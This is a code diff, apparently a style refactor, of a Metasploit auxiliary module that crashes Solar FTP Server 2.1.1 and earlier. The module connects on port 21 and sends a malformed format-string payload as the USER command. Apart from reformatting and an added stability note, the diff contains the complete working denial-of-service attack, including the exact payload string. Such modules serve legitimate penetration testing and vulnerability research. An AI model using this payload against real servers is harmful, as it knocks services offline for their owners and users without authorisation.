@@ -7,32 +7,40 @@ class MetasploitModule < Msf::Auxiliary
   include Msf::Exploit::Remote::Tcp
   include Msf::Auxiliary::Dos
 
-  def initialize(info={})
-    super(update_info(info,
-      'Name'           => 'Solar FTP Server Malformed USER Denial of Service',
-      'Description'    => %q{
-        This module will send a format string as USER to Solar FTP, causing a
-        READ violation in function "__output_1()" found in "sfsservice.exe"
-        while trying to calculate the length of the string. This vulnerability
-        affects versions 2.1.1 and earlier.
-      },
-      'Author'         =>
-      [
-        'x000 <3d3n[at]hotmail.com.br>',           # Initial disclosure/exploit
-        'C4SS!0 G0M3S <Louredo_[at]hotmail.com>',  # Metasploit submission
-        'sinn3r',                                  # Metasploit edit/commit
-      ],
-      'License'        => MSF_LICENSE,
-      'References'     =>
-      [
-        [ 'EDB', '16204' ],
-      ],
-      'DisclosureDate' => '2011-02-22'))
+  def initialize(info = {})
+    super(
+      update_info(
+        info,
+        'Name' => 'Solar FTP Server Malformed USER Denial of Service',
+        'Description' => %q{
+          This module will send a format string as USER to Solar FTP, causing a
+          READ violation in function "__output_1()" found in "sfsservice.exe"
+          while trying to calculate the length of the string. This vulnerability
+          affects versions 2.1.1 and earlier.
+        },
+        'Author' => [
+          'x000 <3d3n[at]hotmail.com.br>', # Initial disclosure/exploit
+          'C4SS!0 G0M3S <Louredo_[at]hotmail.com>',  # Metasploit submission
+          'sinn3r',                                  # Metasploit edit/commit
+        ],
+        'License' => MSF_LICENSE,
+        'References' => [
+          [ 'EDB', '16204' ],
+        ],
+        'DisclosureDate' => '2011-02-22',
+        'Notes' => {
+          'Stability' => [CRASH_SERVICE_DOWN],
+          'SideEffects' => [],
+          'Reliability' => []
+        }
+      )
+    )
 
-      register_options(
+    register_options(
       [
         Opt::RPORT(21)
-      ])
+      ]
+    )
   end
 
   def run
@@ -41,9 +49,9 @@ class MetasploitModule < Msf::Auxiliary
     banner = sock.get_once(-1, 10) || ''
     print_status("Banner: #{banner.strip}")
 
-    buf  = Rex::Text.pattern_create(50)
-    buf << "%s%lf%n%c%l%c%n%n%n%nC%lf%u%lf%d%s%v%n"
-    print_status("Sending format string...")
+    buf = Rex::Text.pattern_create(50)
+    buf << '%s%lf%n%c%l%c%n%n%n%nC%lf%u%lf%d%s%v%n'
+    print_status('Sending format string...')
     sock.put("USER #{buf}\r\n")
 
     disconnect
